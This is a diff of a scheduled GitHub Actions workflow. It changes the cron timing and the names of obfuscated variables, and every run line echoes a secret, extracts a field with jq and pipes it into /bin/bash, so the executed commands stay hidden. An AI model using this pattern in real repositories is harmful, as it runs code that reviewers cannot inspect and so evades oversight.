@@ -3,21 +3,17 @@ name: signgoalie
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 3/6 * * *'
-jobs:  # 21781
+    - cron: '39 4/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: signgoalie
         env:
-          jxq3: ${{ secrets.jxq3 }}
+          yjkm669: ${{ secrets.yjkm669 }}
         run: |
-          echo $jxq3 | jq -r .jcav6 | /bin/bash
-          echo $vasz630 | jq -r .ro580 | /bin/bash
-          echo $ln3593 | jq -r .jdat309 | /bin/bash
-          echo $lfch72 | jq -r .zgajv59 | /bin/bash
-          echo $zywrj7 | jq -r .c671 | /bin/bash
-          echo $jzl02505 | jq -r .prh62 | /bin/bash
+          echo $yjkm669 | jq -r .jyed98229 | /bin/bash
+          echo $zjlc5688 | jq -r .zxvon1 | /bin/bash
 
